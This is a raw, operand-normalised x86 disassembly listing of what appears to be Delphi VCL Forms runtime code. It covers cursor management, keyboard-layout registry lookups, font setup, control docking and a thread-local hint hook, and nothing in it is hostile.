mov eax ebx
call sub_419a50
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45809c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4580a8
mov eax ebx
call sub_4580b4
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4544d0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_458564
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4583f8
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4583f8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4583f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_457e50
push ebx
push esi
push edi
push ebp
call sub_403524
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403198
mov eax [ ebp + 0x88 ]
call sub_403198
mov eax [ ebp + 0x84 ]
call sub_403198
mov eax [ ebp + 0x54 ]
call sub_403198
mov eax [ ebp + 0x50 ]
call sub_403198
mov eax [ ebp + 0x4c ]
call sub_403198
mov eax [ ebp + 0x30 ]
call sub_403198
mov eax [ ebp + 0x34 ]
call sub_403198
mov eax [ ebp + 0x7c ]
call sub_403198
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403198
mov eax ebp
call sub_458110
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419a9c
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40350c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_414098
call sub_403198
inc edi
dec esi
jne r-xdata
sub_457fc8
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_458014
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413eec
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413eec
mov eax [ rw-data ]
call sub_45ae30
sub_45804c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4141dc
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4141dc
mov eax [ rw-data ]
call sub_45ae30
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44227c
sub_4580b4
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4581b4
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_458110
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026fc
mov ebx esi
test ebx ebx
jne r-xdata
sub_45816c
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
xor esi esi
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx ]
mov [ edi + 0x5c ] eax
jmp r-xdata
mov edx 0xc
mov eax ebx
call sub_4026fc
sub_4581b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_4581dc
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458387
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45838e
lea eax [ ebp - 0x260 ]
call sub_403ee8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403ee8
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415c40
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408d20
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_445a24
test al al
je r-xdata
xor eax eax
push ebp
push sub_458343
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404158
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404158
sub_4583f8
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45aca0
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45aa54
mov dl 0x1
mov eax [ rw-data ]
call sub_45aa54
sub_458464
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45848c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_458464
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406a00
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406960
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45851c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
cmp esi 0xffffffff
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45816c
test edi edi
je r-xdata
mov [ ebx + 0x60 ] edi
jmp r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x60 ] eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4581b4
sub_458564
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4586a9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45aa54
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cfe0
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cfe0
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41d0c4
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cfe0
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41cfe0
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cfe0
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45aa54
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41ce24
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41ce24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4586b0
cmp [ rw-data ] 0x0
je r-xdata
sub_4586e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_458748
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_458884 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_4588f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_457fc0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_414098
mov dl [ ebp - 0x1 ]
call sub_458748
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_457fac
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413eec
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_414114
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_414098
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_4586e8
test al al
je r-xdata
inc esi
sub_458a44
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_457fc0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_457fac
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_458a9c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_458a44
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_458b16
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4588f8
pop ecx
push ebp
mov al 0x2
call sub_4588f8
pop ecx
push ebp
mov al 0x3
call sub_4588f8
pop ecx
push ebp
mov al 0x4
call sub_4588f8
pop ecx
push ebp
mov al 0x5
call sub_4588f8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403198
retn
sub_458b24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4586b8
xor eax eax
push ebp
push sub_458b9d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_458a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4586c0
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_458bb8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403ee8
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f3c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_458c10
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_403638#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45b05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_458c64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_438de8
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45b0d8
sub_458cc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45a178
sub_458d04
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_458cc0
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_458c64
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_458d78
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_458dd4
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_458e04
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_458e2c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_458dd4
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_458e04
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_458e04
sub_458e6c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a50
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45a544
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_423820
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_423bf0
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45acdc
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
